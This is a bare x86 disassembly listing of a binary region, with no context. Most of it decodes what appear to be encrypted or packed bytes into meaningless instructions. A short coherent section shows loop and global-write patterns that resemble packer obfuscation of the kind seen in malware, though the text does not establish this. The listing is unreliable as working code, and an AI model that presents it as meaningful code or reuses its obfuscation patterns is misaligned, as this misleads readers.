  40bc73:	mov    edx,0x92e75795
  40bc78:	pop    eax
  40bc79:	std    
  40bc7a:	xchg   DWORD PTR [esi],edi
  40bc7c:	sub    DWORD PTR [ebp-0x51],edi
  40bc7f:	es scas al,BYTE PTR es:[edi]
  40bc81:	int3   
  40bc82:	fidiv  DWORD PTR [ebx+0x48]
  40bc85:	shl    BYTE PTR [ecx],1
  40bc87:	fld    QWORD PTR [ebp+0x31]
  40bc8a:	mov    cl,BYTE PTR [edi+0x26]
  40bc8d:	mov    bl,0xe1
  40bc8f:	mov    al,0xe4
  40bc91:	xor    al,0x29
  40bc93:	test   DWORD PTR [ebp-0x4fe0187a],eax
  40bc99:	in     al,0x36
  40bc9b:	popf   
  40bc9c:	cmp    ch,BYTE PTR [ebp-0x33e2daf]
  40bca2:	and    al,0x79
  40bca4:	mov    esp,0x22f2426b
  40bca9:	cmp    eax,0x59d97b21
  40bcae:	ds pop edx
  40bcb0:	rcr    BYTE PTR [eax-0x87619fa],0x91
  40bcb7:	loop   0x40bcb1
  40bcb9:	pop    ebp
  40bcba:	mov    DWORD PTR [esi-0x4fc37088],edi
  40bcc0:	xor    eax,eax
  40bcc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcc3:	mov    edx,DWORD PTR [edx]
  40bcc5:	pusha  
  40bcc6:	xchg   esp,eax
  40bcc7:	std    
  40bcc8:	jae    0x40bd1f
  40bcca:	push   esp
  40bccb:	lahf   
  40bccc:	push   edx
  40bccd:	mov    ch,0x2a
  40bccf:	out    dx,al
  40bcd0:	mov    ch,0xc8
  40bcd2:	sar    BYTE PTR [ebp+0x12],cl
  40bcd5:	hlt    
  40bcd6:	stos   DWORD PTR es:[edi],eax
  40bcd7:	xchg   ebx,eax
  40bcd8:	aad    0x33
  40bcda:	test   DWORD PTR [ecx+eax*1+0x38],0xcbfcec80
  40bce2:	adc    DWORD PTR [edx-0x1e],0x1374964d
  40bce9:	call   eax
  40bceb:	(bad)  
  40bcec:	shr    BYTE PTR [esi-0x2d],1
  40bcef:	repz and cl,al
  40bcf2:	push   esp
  40bcf3:	cmp    BYTE PTR [ebp+0x2c2f26ba],al
  40bcf9:	and    DWORD PTR [edi+ecx*1-0x5e9bb8c2],eax
  40bd00:	test   BYTE PTR ds:0xb3d04da4,bh
  40bd06:	aaa    
  40bd07:	sar    DWORD PTR [ecx+0x28b2179f],cl
  40bd0d:	(bad)  
  40bd0e:	retf   0xa1a8
  40bd11:	rcl    al,0xfe
  40bd14:	jno    0x40bd23
  40bd16:	test   BYTE PTR [edi-0x6b5a83b6],dh
  40bd1c:	lock sub BYTE PTR [eax],dh
  40bd1f:	sbb    DWORD PTR [edi-0x71],edx
  40bd22:	adc    al,dh
  40bd24:	add    al,0x23
  40bd26:	ja     0x40bd13
  40bd28:	lahf   
  40bd29:	mov    cl,0xa
  40bd2b:	xor    bl,BYTE PTR [ebx-0x7]
  40bd2e:	cmp    al,0x59
  40bd30:	js     0x40bd57
  40bd32:	imul   esp,DWORD PTR [ebx+0x6342124e],0x83b687d6
  40bd3c:	(bad)  
  40bd3d:	xchg   DWORD PTR [ebx-0x55],ecx
  40bd40:	(bad)  
  40bd41:	call   0x384fdc09
  40bd46:	lock jbe 0x40bd84
  40bd49:	lea    edi,[eax-0x5b]
  40bd4c:	call   0x57f8:0xdc79337
  40bd53:	mov    ah,0xf0
  40bd55:	in     al,dx
  40bd56:	xor    ch,0x62
  40bd59:	daa    
  40bd5a:	fldcw  WORD PTR [ebx+ecx*1]
  40bd5d:	xchg   esp,eax
  40bd5e:	into   
  40bd5f:	popf   
  40bd60:	mov    ecx,0xab154ca
  40bd65:	ja     0x40bd77
  40bd67:	(bad)  
  40bd68:	pusha  
  40bd69:	mov    edx,0xf89f9ddb
  40bd6e:	xchg   ebp,eax
  40bd6f:	loope  0x40bd3e
  40bd71:	out    0x49,eax
  40bd73:	jl     0x40bd09
  40bd75:	das    
  40bd76:	xor    BYTE PTR [esi],0x66
  40bd79:	dec    ecx
  40bd7a:	sub    DWORD PTR [edi+eiz*1+0x6a],0xffffffcf
  40bd7f:	(bad)  
  40bd80:	jb     0x40bda5
  40bd82:	iret   
  40bd83:	xor    BYTE PTR [ecx-0x70],ch
  40bd86:	ds inc ebx
  40bd88:	lea    ebx,[ebx]
  40bd8a:	mov    esp,0xf4f4e920
  40bd8f:	xor    edi,ecx
  40bd91:	ror    dl,0x5f
  40bd94:	sub    BYTE PTR [edx+0x8],dh
  40bd97:	xchg   ebp,eax
  40bd98:	rcr    BYTE PTR [ebx-0x1aa15f90],0xe
  40bd9f:	ds pop esi
  40bda1:	mov    ds:0x67661b90,eax
  40bda6:	ja     0x40bd4b
  40bda8:	paddusb mm6,QWORD PTR [eax]
  40bdab:	imul   edx,DWORD PTR [ebx-0x2268fbad],0xffffffe9
  40bdb2:	mov    al,0x78
  40bdb4:	inc    ebx
  40bdb5:	jno    0x40bd4f
  40bdb7:	mov    dl,0x6f
  40bdb9:	jmp    0x7a836d83
  40bdbe:	jge    0x490ed266
  40bdc4:	xor    ebx,DWORD PTR [ecx-0x638a64b7]
  40bdca:	push   eax
  40bdcb:	jecxz  0x40bd7f
  40bdcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdce:	cs jo  0x40be14
  40bdd1:	mov    BYTE PTR [ecx],al
  40bdd3:	mov    ds:0x23ea3c45,al
  40bdd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdd9:	lea    edx,[esi]
  40bddb:	inc    esp
  40bddc:	scas   eax,DWORD PTR es:[edi]
  40bddd:	push   ecx
  40bdde:	pop    ds
  40bddf:	outs   dx,DWORD PTR ds:[esi]
  40bde0:	adc    edi,eax
  40bde2:	jno    0x40bd84
  40bde4:	int3   
  40bde5:	bound  edx,QWORD PTR [esi]
  40bde7:	dec    edi
  40bde8:	mov    ah,0x4
  40bdea:	inc    eax
  40bdeb:	lea    ebx,[esi]
  40bded:	adc    ebp,DWORD PTR [edi]
  40bdef:	repz dec ebp
  40bdf1:	ins    DWORD PTR es:[edi],dx
  40bdf2:	sbb    eax,0xf2ab3f48
  40bdf7:	imul   eax,DWORD PTR [esp+edx*8-0x5796b008],0xffffff95
  40bdff:	sub    ebx,DWORD PTR [edi-0x79]
  40be02:	mov    cl,0xb3
  40be04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be05:	mov    DWORD PTR ds:0xe58a7c76,ebx
  40be0b:	les    ecx,FWORD PTR [edi-0xe]
  40be0e:	push   0xabcb325a
  40be13:	xlat   BYTE PTR ds:[ebx]
  40be14:	inc    edi
  40be15:	ins    DWORD PTR es:[edi],dx
  40be16:	jns    0x40bdf4
  40be18:	sbb    BYTE PTR [ebp+esi*4-0x3a3c7fa0],ch
  40be1f:	mov    al,ds:0xc1582bfd
  40be24:	jno    0x40be29
  40be26:	aaa    
  40be27:	push   cs
  40be28:	xor    ch,bh
  40be2a:	sub    al,0x3f
  40be2c:	ds loopne 0x40be41
  40be2f:	jge    0x40be67
  40be31:	jno    0x40be1d
  40be33:	or     ah,BYTE PTR [eax]
  40be35:	sbb    ebp,edx
  40be37:	neg    BYTE PTR [ebp+0x580e7392]
  40be3d:	xchg   BYTE PTR [edx+0x0],bh
  40be40:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40be42:	jg     0x40bdcb
  40be44:	and    ah,BYTE PTR [esi+eax*4+0x59]
  40be48:	jmp    DWORD PTR [edx+0x2a]
  40be4b:	(bad)  
  40be4c:	cmp    cl,BYTE PTR [edx+eiz*2-0x55]
  40be50:	inc    eax
  40be51:	and    DWORD PTR [edi+0x7c840b37],ebp
  40be57:	xlat   BYTE PTR ds:[ebx]
  40be58:	push   esp
  40be59:	je     0x40bde7
  40be5b:	sbb    eax,0x2f5cea3
  40be60:	jne    0x40be5f
  40be62:	lods   al,BYTE PTR es:[esi]
  40be64:	in     eax,0xa5
  40be66:	ins    BYTE PTR es:[edi],dx
  40be67:	or     DWORD PTR [esi],0xd
  40be6a:	cs adc eax,0x72405168
  40be70:	dec    ebx
  40be71:	cwde   
  40be72:	test   eax,0xdfda44e
  40be77:	push   0x45
  40be79:	xor    eax,0x71e5fccf
  40be7e:	call   0x7445d52d
  40be83:	or     esp,DWORD PTR [eax+edx*1]
  40be86:	and    al,0x92
  40be88:	add    BYTE PTR [esi],ah
  40be8a:	xchg   edi,eax
  40be8b:	and    DWORD PTR [edx-0x29],esp
  40be8e:	mov    ah,0xfd
  40be90:	lock repz adc esp,DWORD PTR ds:0x2085f6c4
  40be98:	sbb    BYTE PTR [eax+0x4],0xd4
  40be9c:	in     al,dx
  40be9d:	dec    edi
  40be9e:	mov    WORD PTR [eax],ds
  40bea0:	jnp    0x40be75
  40bea2:	dec    edi
  40bea3:	dec    edi
  40bea4:	shl    BYTE PTR [edi-0x4b67dfd7],cl
  40beaa:	enter  0xb539,0xe7
  40beae:	loopne 0x40bece
  40beb0:	mov    edi,DWORD PTR [ebp+0x8]
  40beb3:	mov    eax,ds:0x424435
  40beb8:	mov    DWORD PTR ds:0x420e9e,0x18
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	lahf   
  40c013:	aaa    
  40c014:	jmp    0x7b2a94d6
  40c019:	jp     0x40c034
  40c01b:	pop    edi
  40c01c:	jp     0x40c098
  40c01e:	add    BYTE PTR [ebp-0x37],ah
  40c021:	and    eax,0x7f145b19
  40c026:	in     al,0x6e
  40c028:	xchg   esp,eax
  40c029:	mov    ah,0x6d
  40c02b:	outs   dx,BYTE PTR es:[esi]
  40c02d:	or     ah,BYTE PTR [eax+0x42132b8a]
  40c033:	inc    edi
  40c034:	add    ecx,DWORD PTR [ecx+0x43]
  40c037:	jmp    0x40c067
  40c039:	xchg   ecx,eax
  40c03a:	sbb    DWORD PTR [edi],ebp
  40c03c:	test   BYTE PTR [ebx+0x17d4d82b],al
  40c042:	dec    ebx
  40c043:	mov    al,0x71
  40c045:	fld    QWORD PTR [ebp-0x670eb43d]
  40c04b:	enter  0x3419,0x85
  40c04f:	out    0xbb,eax
  40c051:	fs push edi
  40c053:	jl     0x40c079
  40c055:	lahf   
  40c056:	iret   
  40c057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c058:	pop    edi
  40c059:	js     0x40c015
  40c05b:	fwait
  40c05c:	xchg   ah,bl
  40c05e:	mov    BYTE PTR [esp+edi*8],cl
  40c061:	ins    BYTE PTR es:[edi],dx
  40c062:	push   ss
  40c063:	xor    bh,BYTE PTR [edi+0x5338e60c]
  40c069:	cmp    ah,bh
  40c06b:	aam    0xbf
  40c06d:	in     eax,0x25
  40c06f:	das    
  40c070:	adc    DWORD PTR [edi-0x79],ebp
  40c073:	js     0x40c0b8
  40c075:	mov    dh,0xa7
  40c077:	cmp    eax,ecx
  40c079:	arpl   cx,di
  40c07b:	xchg   ebp,eax
  40c07c:	out    0x7,eax
  40c07e:	adc    ch,BYTE PTR [esi+0x5196df3d]
  40c084:	pop    edi
  40c085:	call   0xda80:0xf0a08eb0
  40c08c:	xor    BYTE PTR [eax-0xc],dh
  40c08f:	js     0x40c0c5
  40c091:	shl    DWORD PTR [ebx-0x3c65a833],cl
  40c097:	popf   
  40c098:	add    BYTE PTR es:[edx+ebp*4-0x8],bh
  40c09d:	popf   
  40c09e:	sahf   
  40c09f:	aaa    
  40c0a0:	mov    ebp,0xde98126c
  40c0a5:	in     al,dx
  40c0a6:	xor    eax,0xbc54941b
  40c0ab:	jbe    0x40c076
  40c0ad:	mov    cl,0xf7
  40c0af:	xlat   BYTE PTR ds:[ebx]
  40c0b0:	(bad)  
  40c0b1:	cli    
  40c0b2:	outs   dx,DWORD PTR ds:[esi]
  40c0b3:	sub    eax,edi
  40c0b5:	fucomip st,st(7)
  40c0b7:	adc    eax,0xbbb0dd59
  40c0bc:	mov    bh,0x2a
  40c0be:	mov    WORD PTR ds:0x2136f6ed,es
  40c0c4:	sub    al,0xdc
  40c0c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0c7:	sbb    eax,DWORD PTR [edx+0x3db59ea]
  40c0cd:	cwde   
  40c0ce:	stos   BYTE PTR es:[edi],al
  40c0cf:	and    al,0x99
  40c0d1:	ins    DWORD PTR es:[edi],dx
  40c0d2:	or     al,dh
  40c0d4:	push   edi
  40c0d5:	cmp    ah,BYTE PTR [esi-0x27]
  40c0d8:	pop    ds
  40c0d9:	ret    0x671a
  40c0dc:	(bad)  
  40c0dd:	fdiv   QWORD PTR [edx-0x7f]
  40c0e0:	je     0x40c069
  40c0e2:	jmp    0x8c5f356f
  40c0e7:	mov    ss,WORD PTR [edi]
  40c0e9:	mov    cl,0xf6
  40c0eb:	ret    0x24e2
  40c0ee:	scas   al,BYTE PTR es:[edi]
  40c0ef:	mov    ecx,0x92eedd52
  40c0f4:	sbb    BYTE PTR [edi],al
  40c0f6:	popa   
  40c0f7:	fld    TBYTE PTR [edi-0x34de43d4]
  40c0fd:	int3   
  40c0fe:	add    ebx,0xffffff80
  40c101:	jae    0x40c0d5
  40c103:	jae    0x40c172
  40c105:	les    eax,FWORD PTR [edi+0x39e34ff0]
  40c10b:	pop    eax
  40c10c:	mov    eax,0x64bce92a
  40c111:	aaa    
  40c112:	fdiv   DWORD PTR [esi]
  40c114:	cmc    
  40c115:	adc    bl,0x18
  40c118:	inc    ecx
  40c119:	mov    ds:0x3d07baf7,eax
  40c11e:	repnz ins BYTE PTR es:[edi],dx
  40c120:	inc    esp
  40c121:	pop    es
  40c122:	adc    al,0xa7
  40c124:	pop    edx
  40c125:	cmp    eax,0xe0f748a2
  40c12a:	sbb    eax,0x87dc148a
  40c12f:	ror    cl,1
  40c131:	or     ah,BYTE PTR ds:0x1c6193ed
  40c137:	sub    eax,0xb0aec225
  40c13c:	loop   0x40c113
  40c13e:	and    ebx,eax
  40c140:	test   al,0x24
  40c142:	sub    eax,esi
  40c144:	sbb    al,0x25
  40c146:	push   esp
  40c147:	mov    edi,0xee20e9f
  40c14c:	xchg   edx,eax
  40c14d:	cwde   
  40c14e:	lahf   
  40c14f:	(bad)  
  40c150:	cmc    
  40c151:	in     eax,0x57
  40c153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c154:	mov    al,ds:0xc488f195
  40c159:	lahf   
  40c15a:	ret    
  40c15b:	fsub   QWORD PTR [edi-0x5f]
  40c15e:	sbb    al,0x89
  40c160:	xchg   esp,eax
  40c161:	cmp    ecx,DWORD PTR [ecx-0x59]
  40c164:	aaa    
  40c165:	imul   esp,DWORD PTR [ecx+eiz*2+0xa],0x30
  40c16a:	push   0x629fe3c5
  40c16f:	adc    BYTE PTR ds:0x86f98c80,dh
  40c175:	pop    esp
  40c176:	sbb    al,0xdf
  40c178:	pusha  
  40c179:	mov    dh,0x1f
  40c17b:	mov    dl,0x1
  40c17d:	(bad)  
  40c17e:	jge    0x40c166
  40c180:	repz mov bl,BYTE PTR [ecx+ecx*8]
  40c184:	sbb    al,0xc8
  40c186:	add    BYTE PTR ds:0x5bcf55da,0xbc
  40c18d:	shl    al,0x1b
  40c190:	pop    esi
  40c191:	xchg   ebx,eax
  40c192:	inc    esi
  40c193:	sbb    edi,DWORD PTR [ebx+0x7]
  40c196:	je     0x40c11d
  40c198:	es enter 0x159c,0x87
  40c19d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c19e:	mov    dl,0x5f
  40c1a0:	sti    
  40c1a1:	aam    0xdf
  40c1a3:	popa   
  40c1a4:	scas   al,BYTE PTR es:[edi]
  40c1a5:	loopne 0x40c1c6
  40c1a7:	popa   
  40c1a8:	mov    edx,0x220a489a
  40c1ad:	adc    BYTE PTR [edx-0x62],cl
  40c1b0:	and    al,0x6d
  40c1b2:	(bad)  
  40c1b3:	aad    0xf1
  40c1b5:	sub    al,0x5b
  40c1b7:	xor    BYTE PTR [ecx],dh
  40c1b9:	gs (bad) 
  40c1bb:	push   edx
  40c1bc:	pop    ds
  40c1bd:	and    al,0x2e
  40c1bf:	mov    eax,ds:0x3fdf992b
  40c1c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1c5:	call   0xe503d517
  40c1ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1cb:	dec    edi
  40c1cc:	or     al,0xa0
  40c1ce:	sbb    al,0x8
  40c1d0:	inc    eax
  40c1d1:	hlt    
  40c1d2:	jno    0x40c1dc
  40c1d4:	inc    ecx
  40c1d5:	neg    BYTE PTR [edi+0x19]
  40c1d8:	(bad)  
  40c1d9:	mov    eax,0xca33b7eb
  40c1de:	jbe    0x40c1cd
  40c1e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1e1:	test   al,0x51
  40c1e3:	mov    dl,BYTE PTR [edi+ebx*2+0x13]
  40c1e7:	push   0xee08845c
  40c1ec:	std    
  40c1ed:	and    DWORD PTR [edx+0x728bd8b],edi
  40c1f3:	xchg   ecx,eax
  40c1f4:	push   0x7c
  40c1f6:	cmp    edx,ecx
  40c1f8:	js     0x40c193
  40c1fa:	sahf   
  40c1fb:	icebp  
  40c1fc:	jmp    0x40c1ef
  40c1fe:	sbb    DWORD PTR [ebp-0x7cd5552b],0x76
  40c205:	mov    ah,0x9f
  40c207:	jns    0x40c1c0
  40c209:	mov    esi,0xf36d377a
  40c20e:	addr16 (bad) 
  40c210:	jmp    0x35f8:0x9e49cdee
  40c217:	les    ecx,FWORD PTR [eax+0x7b01e810]
  40c21d:	rcr    BYTE PTR [ebx],cl
  40c21f:	xchg   edi,eax
  40c220:	pop    ebp
  40c221:	f2xm1  
  40c223:	inc    esp
  40c224:	iret   
  40c225:	shl    BYTE PTR [ebx+0x3891cf69],cl
  40c22b:	call   0xf012cd4f
  40c230:	imul   ebx,DWORD PTR [ecx+0x378fa7d7],0x46b8261a
  40c23a:	sbb    eax,0xc00e28a7
  40c23f:	bound  edi,QWORD PTR [esi]
  40c241:	imul   edi,eax,0x7
  40c244:	xor    DWORD PTR [eax-0x2c],ecx
  40c247:	mov    ebx,0x6ddb226c
  40c24c:	stc    
  40c24d:	pop    ebp
  40c24e:	jg     0x40c2b5
  40c250:	pushw  0x40
  40c253:	mov    cl,0xa4
  40c255:	mov    edx,0x4d51f0be
  40c25a:	mov    eax,0xed713558
  40c25f:	test   DWORD PTR [ecx-0x33],ebx
  40c262:	jns    0x40c206
  40c264:	cs loopne 0x40c237
  40c267:	adc    DWORD PTR [ebx+0x25a067c6],ebx
  40c26d:	adc    al,BYTE PTR [ebp-0xef6757b]
  40c273:	mov    ah,0x89
  40c275:	shl    cl,0x59
  40c278:	dec    edi
  40c279:	nop
  40c27a:	jo     0x40c26b
  40c27c:	ficomp WORD PTR [eax+edx*1-0x56f02c75]
  40c283:	mov    WORD PTR [ebx-0x9d9fc01],?
  40c289:	and    edx,DWORD PTR [ecx-0x6f]
  40c28c:	push   0x49b80a85
  40c291:	cmp    al,0xc1
  40c293:	mov    eax,0x96ba5c5d
  40c298:	daa    
  40c299:	xchg   ebp,eax
  40c29a:	push   eax
  40c29b:	xor    bh,bl
  40c29d:	adc    DWORD PTR [ecx-0x38],eax
  40c2a0:	sbb    al,0x4d
  40c2a2:	mov    ebx,0x99f0fc37
  40c2a7:	inc    esi
  40c2a8:	xor    esp,ebp
  40c2aa:	and    cl,BYTE PTR [ebp+0x5396d5d8]
  40c2b0:	mov    DWORD PTR [ebp+0x5d],0x32905c56
  40c2b7:	daa    
  40c2b8:	mov    edi,DWORD PTR [edi]
  40c2ba:	aas    
  40c2bb:	nop
  40c2bc:	dec    ecx
  40c2bd:	or     ch,ch
  40c2bf:	cmp    esp,DWORD PTR [eax-0x22]
  40c2c2:	jmp    0x40c304
  40c2c4:	rcr    DWORD PTR ss:[edx-0x5b8e4b8],cl
  40c2cb:	add    eax,0x501849fe
  40c2d0:	dec    esp
  40c2d1:	jnp    0x40c34c
  40c2d3:	fcomp  DWORD PTR [edx-0x42]
  40c2d6:	jno    0x40c309
  40c2d8:	cmp    al,0x85
  40c2da:	fadd   QWORD PTR [ebx+0x4cd64a79]
  40c2e0:	lahf   
  40c2e1:	sub    bl,BYTE PTR [ebp-0x7ab4846c]
  40c2e7:	(bad)  
  40c2e8:	in     al,0x2c
  40c2ea:	cld    
  40c2eb:	stos   DWORD PTR es:[edi],eax
  40c2ec:	cmp    edx,esp
  40c2ee:	adc    BYTE PTR [ebx-0x75a80178],cl
  40c2f4:	rcl    DWORD PTR ds:0x8de3425a,0xe9
  40c2fb:	sbb    esp,eax
  40c2fd:	mov    esi,0x68fba8f4
  40c302:	cmp    DWORD PTR [edx-0x7177e897],ebx
  40c308:	xchg   esp,eax
  40c309:	dec    edx
  40c30a:	call   0x7a1d:0x4fab7107
  40c311:	or     BYTE PTR [ebp+edi*1+0x38125c2c],bh
  40c318:	mov    eax,ds:0x2ffb9d49
  40c31d:	std    
  40c31e:	aas    
  40c31f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c320:	dec    ebp
  40c321:	lods   eax,DWORD PTR ds:[esi]
  40c322:	packsswb mm4,QWORD PTR [ebx+0x42]
  40c326:	dec    esi
  40c327:	dec    edx
  40c328:	push   DWORD PTR [ecx+0x6e]
  40c32b:	(bad)  
  40c32c:	fcmovbe st,st(4)
  40c32e:	pop    ebx
  40c32f:	dec    edi
  40c330:	xchg   ecx,eax
  40c331:	mov    bl,0x3
  40c333:	sub    al,0x49
  40c335:	jmp    0x976a:0x16edf698
  40c33c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c33d:	icebp  
  40c33e:	adc    BYTE PTR ds:0xfa9930ee,dl
  40c344:	enter  0xa162,0xc5
  40c348:	pop    ds
  40c349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c34a:	out    0x4,al
  40c34c:	icebp  
  40c34d:	imul   eax,DWORD PTR [ecx+0x52],0x8d01161d
  40c354:	(bad)  
  40c355:	data16 loop 0x40c366
  40c358:	mov    ebx,0x875fa3fa
  40c35d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c35e:	pop    ecx
  40c35f:	mov    esp,0xc1af15f9
  40c364:	inc    esi
  40c365:	sub    al,0x25
  40c367:	lods   al,BYTE PTR ds:[esi]
  40c368:	jecxz  0x40c397
  40c36a:	pop    ecx
  40c36b:	clc    
  40c36c:	ds cs test eax,0x45dbd3e2
  40c373:	mov    ds:0xf3070f04,eax
  40c379:	mov    ebp,0x79d0e82
  40c37e:	sbb    eax,DWORD PTR [ebp+0x3a]
  40c381:	dec    ebp
  40c382:	sbb    dl,BYTE PTR [ecx+0x3]
  40c385:	fnsave [esi-0x4e]
  40c388:	inc    edx
  40c389:	cdq    
  40c38a:	xchg   ebp,eax
  40c38b:	(bad)  
  40c38c:	mov    DWORD PTR [edx+0x40f74ca0],edi
  40c392:	out    dx,eax
  40c393:	adc    bh,BYTE PTR [ecx]
  40c395:	xor    BYTE PTR [ebx+ebx*1+0x5fd1a36d],0xd1
  40c39d:	stc    
  40c39e:	sub    al,0x98
  40c3a0:	or     al,0x38
  40c3a2:	das    
  40c3a3:	mov    eax,ds:0x90eb5688
  40c3a8:	adc    DWORD PTR [edx+0xc],ebx
  40c3ab:	in     eax,dx
  40c3ac:	shr    BYTE PTR [edx-0x31],1
  40c3af:	je     0x40c373
  40c3b1:	push   eax
  40c3b2:	push   edi
  40c3b3:	test   BYTE PTR [edx+0x60],ch
  40c3b6:	int3   
  40c3b7:	sahf   
  40c3b8:	call   0x334f:0x1cf05522
  40c3bf:	pop    esp
  40c3c0:	cmp    ch,BYTE PTR [esi]
  40c3c2:	jb     0x40c3fb
  40c3c4:	and    DWORD PTR [ebp-0x7bd32a0e],edx
  40c3ca:	push   edi
  40c3cb:	test   eax,0x7b207f1b
  40c3d0:	dec    edx
  40c3d1:	(bad)  
  40c3d2:	push   eax
  40c3d3:	rcl    ebx,1
  40c3d5:	les    eax,FWORD PTR [ebp+0x14209506]
  40c3db:	enter  0x4146,0xbc
  40c3df:	ins    BYTE PTR es:[edi],dx
  40c3e0:	xchg   ebx,eax
  40c3e1:	ror    DWORD PTR [esi+ecx*2-0x77caa168],0xcb
  40c3e9:	inc    ebx
  40c3ea:	mov    esp,DWORD PTR [edi+0x1db4da85]
  40c3f0:	sub    bl,BYTE PTR [eax+0x775877b1]
  40c3f6:	add    DWORD PTR [esi],ecx
  40c3f8:	lea    eax,[edx+0x12]
  40c3fb:	mov    cl,0x55
  40c3fd:	xchg   ecx,eax
  40c3fe:	cmp    al,0x13
  40c400:	mov    cl,0x71
  40c402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c403:	mov    cl,0x46
  40c405:	inc    ecx
  40c406:	clc    
  40c407:	daa    
  40c408:	sti    
  40c409:	dec    eax
  40c40a:	outs   dx,DWORD PTR ds:[esi]
  40c40b:	mov    ds:0xa7b35c33,al
  40c410:	pop    ebp
  40c411:	add    dl,ah
  40c413:	jle    0x40c428
  40c415:	adc    dh,al
  40c417:	pop    edx
  40c418:	xchg   BYTE PTR ds:0x60f680ea,ch
  40c41e:	mov    ebp,0xbf54dafa
  40c423:	pop    ds
  40c424:	pushf  
  40c425:	hlt    
  40c426:	inc    ebx
  40c427:	and    al,0xff
  40c429:	repz mov gs,WORD PTR [edi+0x56]
  40c42d:	push   edi
  40c42e:	add    BYTE PTR [eax+ebx*4+0x2fb17751],ch
  40c435:	call   0x4c2fff2a
  40c43a:	les    ebp,FWORD PTR [edi-0x4717de8f]
  40c440:	mov    edx,0x9b09e44d
  40c445:	scas   eax,DWORD PTR es:[edi]
  40c446:	dec    ebp
  40c447:	jae    0x40c408
  40c449:	jge    0x40c474
  40c44b:	dec    edx
  40c44c:	inc    ecx
  40c44d:	cwde   
  40c44e:	cmp    edi,DWORD PTR [edi+0x2f]
  40c451:	push   ss
  40c452:	cld    
  40c453:	js     0x40c4a4
  40c455:	or     BYTE PTR [ecx],ch
  40c457:	jno    0x40c481
  40c459:	aas    
  40c45a:	lds    edi,FWORD PTR [edx+0x30]
  40c45d:	sti    
  40c45e:	mov    ah,BYTE PTR [ecx-0xe]
  40c461:	mov    edx,0x452468cb
  40c466:	inc    esi
  40c467:	ins    BYTE PTR es:[edi],dx
  40c468:	and    al,0x25
  40c46a:	ins    DWORD PTR es:[edi],dx
  40c46b:	add    ebx,DWORD PTR [ebp+0x23]
  40c46e:	push   cs
  40c46f:	add    al,0x52
  40c471:	les    ecx,FWORD PTR [eax-0x21]
  40c474:	and    ah,BYTE PTR [eax]
  40c476:	inc    edi
  40c477:	sub    ecx,esp
